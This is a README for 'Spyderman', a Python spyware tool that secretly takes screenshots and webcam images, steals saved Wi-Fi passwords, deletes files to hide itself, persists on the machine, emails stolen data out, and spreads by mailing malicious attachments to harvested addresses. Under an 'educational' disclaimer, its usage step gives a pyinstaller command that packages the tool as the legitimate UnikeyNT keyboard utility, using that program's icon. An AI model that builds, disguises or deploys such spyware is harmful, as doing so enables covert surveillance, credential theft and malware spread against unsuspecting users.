# Spyderman

**Disclaimer:** This project is for educational purposes only. It demonstrates concepts related to system information gathering, file manipulation, and email operations. The project should not be used for malicious activities, and the author does not endorse any illegal use of this code. Always ensure that your actions comply with legal guidelines and ethical standards.

## Overview

The **Spyderman** project is a Python-based tool that combines various functionalities, such as capturing system information, screenshots, webcam images, spreading files via email, and monitoring system activity. It utilizes libraries such as `psutil`, `cv2`, `pyautogui`, `smtplib`, and others to interact with the system, capture data, and send emails.

### Key Features:
- **System Information Gathering:** Collects details about the operating system, network interfaces, and other system properties.
- **Camera and Screenshot Capture:** Takes periodic screenshots and webcam images.
- **File Deletion:** Removes files to hide traces of the tool's operations.
- **Email Communication:** Sends collected data and images via email.
- **Wi-Fi Credentials:** Retrieves saved Wi-Fi profiles (on Windows systems).
- **Persistence:** Attempts to ensure the tool continues to run by creating files in specific locations.

## Features Explained

### 1. **System Information Collection:**
   - Collects information about the system (e.g., OS name, version, system model).
   - Gathers network card information, including IP addresses.

### 2. **Camera & Screenshot Capture:**
   - Automatically captures webcam images and screenshots at regular intervals.
   - Saves images with timestamps for easy identification.

### 3. **File Management:**
   - Deletes files from the system to avoid detection and cover its tracks.
   - Handles various file types, such as `.txt`, `.docx`, `.pdf`, `.xlsx`, etc., to find and collect email addresses.

### 4. **Email Sending:**
   - Uses SMTP to send emails, attaching captured images and system information.
   - Supports sending emails with large attachments, with a 25 MB size limit.

### 5. **Wi-Fi Credentials Retrieval (Windows only):**
   - Retrieves saved Wi-Fi SSID and passwords from the system using the `netsh` command.

### 6. **Persistence Mechanism:**
   - Attempts to persist on the system by placing files in specific locations (e.g., `%APPDATA%`).

### 7. **Malware Spreading:**
   - Can send malicious attachments to a list of victim emails, spreading files via email.

## Installation

### Prerequisites
- Python 3.x
- The following Python libraries:
  - `psutil`
  - `cv2` (OpenCV)
  - `pyautogui`
  - `smtplib`
  - `re`
  - `tempfile`
  - `os`
  - `subprocess`
  - `threading`
 
### Create account gmail server //CHANGE LINE 203, 469, 484
## Set Up Gmail for SMTP Using App Passwords (Recommended for Accounts with 2FA Enabled)

If you have **two-factor authentication (2FA)** enabled (which is recommended for extra security), you will need to generate an **App Password** to use Gmail's SMTP server for sending emails programmatically.

### Steps to Set Up App Password for Gmail SMTP:

1. **Sign in to your Google Account**:
   - [Google Account Login](https://accounts.google.com/)

2. **Enable Two-Factor Authentication (if you haven't already)**:
   - Go to the **Security** section in your Google Account settings.
   - Under **"Signing in to Google"**, choose **2-Step Verification**.
   - Follow the on-screen instructions to set up 2FA, which usually involves verifying your phone number.

3. **Generate an App Password**:
   - After 2FA is enabled, return to the **Security** section in your account settings.
   - Under **"App passwords"**, click **Generate App Password**.
   - Google will ask you to select the app and device for which you need an app password. Choose:
     - **App**: `Mail`
     - **Device**: `Windows Computer` (or choose an appropriate device for your application).
   - Google will generate a **16-character app password** for you.

4. **Use the App Password in Your Python Code**:
   - Instead of using your Gmail account password, use the 16-character **App Password** generated in the previous step.
   - This ensures that Gmail’s SMTP server will accept your email-sending requests from your application securely.

### Example:

```python
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Set up email details
sender_email = "your-email@gmail.com"
app_password = "your-16-character-app-password"  # Replace with your App Password
recipient_email = "recipient-email@example.com"
subject = "Test Email"
body = "This is a test email sent from Python using Gmail's SMTP server."

# Set up MIME email message
msg = MIMEMultipart()
msg['From'] = sender_email
msg['To'] = recipient_email
msg['Subject'] = subject
msg.attach(MIMEText(body, 'plain'))

# Send email via Gmail's SMTP server
try:
    # Connect to Gmail's SMTP server on port 587
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()  # Secure the connection
    
    # Log in with your Gmail email address and App Password
    server.login(sender_email, app_password)
    
    # Send the email
    server.sendmail(sender_email, recipient_email, msg.as_string())
    print("Email sent successfully!")
    
    # Quit the SMTP server connection
    server.quit()

except Exception as e:
    print(f"Error: {e}")


 
### Setup
1. Clone the repository:
   ```bash
   git clone https://github.com/thangcongtran/Spyderman.git
   cd Spyderman
2. (Optional) Set up a virtual environment:
   ```bash
   python -m venv venv
   source venv/bin/activate  # For Linux/macOS
   venv\Scripts\activate  # For Windows
3. Install the required libraries using `pip`:
   ```bash
   pip install -r requirements.txt
4. Usage
   ```bash
   pyinstaller --add-data="..\..\spyderman\File_embed\UnikeyNT.exe;." --icon ...\..\spyderman\File_embed\Unikeynt_101-4.ico --onefile --noupx spyderman.py --name UnikeyNT


---

### Important Notes:

1. **Email Sending & Gmail**: In your code, you have functionality for sending emails using Gmail. Please note that **Google** may block sign-in attempts if it detects suspicious activity (e.g., logging in from a new device or location). To securely send emails, consider using **OAuth 2.0** or **App Passwords** instead of hardcoding the Gmail credentials.

2. **Ethical Considerations**: Always use such tools for **ethical** purposes and **with consent**. Do not use this code to conduct unauthorized activities such as surveillance, data theft, or malware distribution. Unauthorized actions could result in **legal consequences**.

3. **Legal Compliance**: Make sure to comply with all **privacy** and **data protection** laws (like GDPR, CCPA, etc.) and the terms of service of any services or APIs you use (such as Gmail's SMTP server). Misuse of this project can lead to severe legal consequences, including penalties and imprisonment.

4. **Sensitive Data**: Ensure that you're not violating the privacy of others by collecting sensitive data without proper consent. Respect users' privacy rights.
